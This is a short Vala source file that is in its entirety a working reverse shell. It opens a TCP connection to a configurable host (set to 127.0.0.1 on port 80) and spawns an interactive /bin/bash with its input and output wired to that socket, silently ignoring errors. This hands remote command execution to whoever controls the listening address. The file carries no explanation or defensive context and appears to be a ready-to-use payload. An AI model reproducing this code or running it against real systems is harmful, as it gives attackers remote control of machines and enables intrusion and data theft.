uint16 port = 80;
unowned string host = "127.0.0.1";

void main (string[] args) {
	try 
        {
                InetAddress address = new InetAddress.from_string (host);
                InetSocketAddress inetaddress = new InetSocketAddress(address, port);
                Socket s = new Socket(SocketFamily.IPV4, SocketType.STREAM, SocketProtocol.TCP);
                s.connect (inetaddress);
                int sock_fd = s.get_fd();
                string[] cmd = {"/bin/bash", "-i"};
                Process.spawn_async_with_fds (null, cmd,null, SpawnFlags.FILE_AND_ARGV_ZERO, null,null, sock_fd, sock_fd, sock_fd);
                return;
	} catch (Error e) {
                return;
	}
}